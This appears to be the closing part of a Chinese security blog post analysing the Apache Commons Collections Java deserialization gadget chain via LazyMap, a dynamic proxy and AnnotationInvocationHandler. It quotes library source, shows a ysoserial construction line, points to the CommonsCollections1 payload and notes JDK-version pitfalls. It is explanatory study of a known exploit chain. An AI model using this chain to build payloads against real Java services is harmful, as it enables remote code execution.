+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在调用get函数时，当传入的key不存在时，即可触发transform的调用。但是要触发该函数执行，需要借助动态代理</p>
+<p>最终通过Ysoserial中CommonsCollections1中的payload生成流程，可以得到以下调用链</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br></pre></td></tr></table></figure>
+
+<p>最终会通过Proxy生成对应的动态代理：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));</span><br></pre></td></tr></table></figure>
+
+<p>allIfaces则对应Map数据类型的接口，ih为创建的AnnotationInvocationHandler。</p>
+<p>因此在AnnotationInvocationHandler反序列化的位置1处调用：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br></pre></td></tr></table></figure>
+
+<p>由于memberValues为构造的Proxy类型，当调用任意函数时都会调用AnnotationInvocationHandler.invoke函数，位置1调用entrySet函数：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();		<span class="comment">// var4为&quot;entrySet&quot;</span></span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);		<span class="comment">// 触发执行get函数</span></span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会尝试调用get函数，获取key为”entrySet”对应的值。但key不存在则进入了触发流程：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);		<span class="comment">// 触发执行链</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java%E5%8D%B3%E5%8F%AF%E8%BF%9B%E8%A1%8C%E5%A4%8D%E7%8E%B0">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java即可进行复现</a></p>
+<p>ps：这里也可以通过TiedMapEntry的toString方法调用getValue-&gt;map.get来进行触发</p>
+<h2 id="碰到的坑"><a href="#碰到的坑" class="headerlink" title="碰到的坑"></a>碰到的坑</h2><p>在jdk8的情况利用，提示以下错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet</span><br><span class="line">at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:81)</span><br><span class="line">at com.sun.proxy.$Proxy0.entrySet(Unknown Source)</span><br></pre></td></tr></table></figure>
+
+<p>测试JDK7同样的问题，最后切换至JDK6成功触发</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set</span><br><span class="line">	at com.sun.proxy.$Proxy0.entrySet(Unknown Source)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>反序列化的问题早在2015年就被爆出，但是有长达9个月并未获得足够的关注，后来FoxGlove Security安全团队的<code>@breenmachine</code>发布一篇博客，阐述如何利用Apache Commons Collections在实际场景中进行利用，常见的web应用几乎都中枪了</p>
+<p>对于反序列化漏洞主要是提炼可利用的执行链，当然最初的切入点还是readObject函数</p>
+<p>对于反序列化漏洞挖掘，个人理解：</p>
+<ul>
+<li>应用可接收序列化数据的接口</li>
+<li>获取该应用内部存在的执行链</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 java反序列化原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Apache-Commons-Collections%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">0x02 Apache Commons Collections利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-AnnotationInvocationHandler%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">0x03 AnnotationInvocationHandler反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%9F%BA%E4%BA%8ETransformedMap%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">5.</span> <span class="toc-text">0x04 基于TransformedMap的调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%9F%BA%E4%BA%8ELazyMap%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">6.</span> <span class="toc-text">0x05 基于LazyMap的调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A2%B0%E5%88%B0%E7%9A%84%E5%9D%91"><span class="toc-number">7.</span> <span class="toc-text">碰到的坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">0x06 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&text=反序列化-Apache Commons Collections"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&is_video=false&description=反序列化-Apache Commons Collections"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=反序列化-Apache Commons Collections&body=Check out this article: http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&title=反序列化-Apache Commons Collections"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&name=反序列化-Apache Commons Collections&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/01/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Apache-Commons-Collections/&t=反序列化-Apache Commons Collections"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2022
+    PENCH3R
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js" crossorigin="anonymous"></script>
+  
+<script src="/js/wrapImage.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
